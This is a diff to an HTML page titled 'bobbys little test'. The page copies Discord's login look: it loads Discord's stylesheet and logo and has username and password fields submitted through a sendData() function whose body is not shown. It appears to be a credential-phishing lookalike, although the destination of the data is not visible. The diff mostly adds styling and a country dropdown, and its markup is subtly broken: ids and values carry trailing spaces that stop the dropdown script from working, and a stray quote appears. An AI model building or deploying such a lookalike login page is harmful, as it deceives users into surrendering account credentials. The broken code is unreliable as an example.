@@ -3,6 +3,7 @@
 
 <head>
     <title>bobbys little test</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://discord.com/assets/e286f3f761469ae40a8ed41b4289d5ab.css">
     <style>
         body {
@@ -130,6 +131,11 @@
             margin-right: 15px;
             margin-top: 10px;
             letter-spacing: .7px;
+            margin-left: 5px;
+        }
+        
+        .userinput input:first-child {
+            margin-top: 60px;
         }
         
         .userinput input::placeholder {
@@ -156,6 +162,17 @@
             width: 100%;
             width: 101%;
             margin-right: auto;
+            margin-bottom: 16%;
+        }
+        
+        .login {
+            position: absolute;
+            color: #DCDDDE;
+            left: 38%;
+            top: 37%;
+            font-size: 30px;
+            text-transform: uppercase;
+            font-weight: 700;
         }
         
         .topborder {
@@ -174,6 +191,17 @@
             background-color: #7289DA;
         }
         
+        .discord {
+            position: absolute;
+            top: -19%;
+            left: 30%;
+            color: #a2abe0;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            font-size: 50px;
+            text-transform: capitalize;
+            font-weight: 900;
+        }
+        
         .rectangle {
             position: relative;
             width: 400px;
@@ -184,6 +212,51 @@
             margin: auto;
             right: 0px;
             box-sizing: border-box;
+        }
+        
+        .custom-dropdown {
+            position: relative;
+            display: inline-block;
+            width: 150px;
+            left: 30%;
+            border: 2px solid #4b0082;
+            border-radius: 5px;
+            transform: translateY(1050%);
+        }
+        
+        .custom-dropdown select {
+            width: 100%;
+            padding: 5px 10px;
+            /* Adjust the padding values here */
+            font-size: 16px;
+            border: none;
+            background-color: #7289da;
+            color: white;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            cursor: pointer;
+        }
+        
+        .custom-dropdown select:hover {
+            background-color: #5a6b8c;
+        }
+        
+        .custom-dropdown select:focus {
+            outline: none;
+        }
+        
+        .custom-dropdown::after {
+            content: '\25BC';
+            position: absolute;
+            top: 7px;
+            right: 10px;
+            color: white;
+            pointer-events: none;
+        }
+        
+        select:focus {
+            outline: none;
         }
         
         @media (max-width: 768px) {
@@ -214,6 +287,65 @@
                 });
             });
         });
+        const dropdown = document.getElementById('country-dropdown');
+
+        dropdown.addEventListener('change', function() {
+            const selectedValue = dropdown.value;
+
+            // Change the background color based on the selected value
+            switch (selectedValue) {
+                case 'america':
+                    dropdown.style.backgroundColor = '#7289da';
+                    break;
+                case 'china':
+                    dropdown.style.backgroundColor = '#f04747';
+                    break;
+                case 'india':
+                    dropdown.style.backgroundColor = '#43b581';
+                    break;
+                    // Add more cases for additional options
+                case 'germany':
+                    dropdown.style.backgroundColor = '#faa61a';
+                    break;
+                case 'japan':
+                    dropdown.style.backgroundColor = '#d62976';
+                    break;
+                case 'russia':
+                    dropdown.style.backgroundColor = '#1dcaff';
+                    break;
+                    // Add more cases for other countries
+                default:
+                    dropdown.style.backgroundColor = '#7289da';
+            }
+        });
+
+        // Set the initial background color based on the selected option on page load
+        const initialSelectedValue = dropdown.value;
+
+        switch (initialSelectedValue) {
+            case 'america':
+                dropdown.style.backgroundColor = '#7289da';
+                break;
+            case 'china':
+                dropdown.style.backgroundColor = '#f04747';
+                break;
+            case 'india':
+                dropdown.style.backgroundColor = '#43b581';
+                break;
+                // Add more cases for additional options
+            case 'germany':
+                dropdown.style.backgroundColor = '#faa61a';
+                break;
+            case 'japan':
+                dropdown.style.backgroundColor = '#d62976';
+                break;
+            case 'russia':
+                dropdown.style.backgroundColor = '#1dcaff';
+                break;
+                // Add more cases for other countries
+            default:
+                dropdown.style.backgroundColor = '#7289da';
+        }
 
         function sendData() {
             var email = $("#email").val();
@@ -246,13 +378,58 @@
     <div class="support"><button>Customer Support</button></div>
     <div class="topborder"> </div>
     <div class="rectangle">
-        <img src="https://www.svgrepo.com/show/353655/discord-icon.svg" width="100px" height="100px" alt="Discord Logo">
-        <div class="userinput">
-            <input type="text" id="email" placeholder="Email" autocomplete="off">
-            <input type="password" id="password" placeholder="Password" autocomplete="off">
+        <div class="discord">Andrew</div>
+        <div class="login">Login</div>
+        <div class="custom-dropdown" ">
+            <select id="country-dropdown ">
+                <option value=" " disabled selected>Select Country</option>
+                <option value="america ">America</option>
+                <option value="china ">China</option>
+                <option value="india ">India</option>
+                <option value="indonesia ">Indonesia</option>
+                <option value="pakistan ">Pakistan</option>
+                <option value="brazil ">Brazil</option>
+                <option value="nigeria ">Nigeria</option>
+                <option value="bangladesh ">Bangladesh</option>
+                <option value="russia ">Russia</option>
+                <option value="mexico ">Mexico</option>
+                <option value="japan ">Japan</option>
+                <option value="ethiopia ">Ethiopia</option>
+                <option value="philippines ">Philippines</option>
+                <option value="egypt ">Egypt</option>
+                <option value="vietnam ">Vietnam</option>
+                <option value="drcongo ">DR Congo</option>
+                <option value="turkey ">Turkey</option>
+                <option value="iran ">Iran</option>
+                <option value="germany ">Germany</option>
+                <option value="thailand ">Thailand</option>
+                <option value="uk ">United Kingdom</option>
+                <option value="france ">France</option>
+                <option value="italy ">Italy</option>
+                <option value="tanzania ">Tanzania</option>
+                <option value="southafrica ">South Africa</option>
+                <option value="myanmar ">Myanmar</option>
+                <option value="southkorea ">South Korea</option>
+                <option value="colombia ">Colombia</option>
+                <option value="kenya ">Kenya</option>
+                <option value="spain ">Spain</option>
+                <option value="uganda ">Uganda</option>
+                <option value="argentina ">Argentina</option>
+                <option value="algeria ">Algeria</option>
+                <option value="sudan ">Sudan</option>
+                <option value="ukraine ">Ukraine</option>
+                <option value="iraq ">Iraq</option>
+            </select>
         </div>
-        <button class="button" onclick="sendData()">Submit</button>
+
+        <img src="https://www.svgrepo.com/show/353655/discord-icon.svg " width="100px " height="100px " alt="Discord Logo ">
+        <div class="userinput ">
+            <input type="text " id="email " placeholder="Username " autocomplete="off ">
+            <input type="password " id="password " placeholder="Password " autocomplete="off ">
+        </div>
+        <button class="button " onclick="sendData() ">Submit</button>
     </div>
+
 </body>
 
 </html>
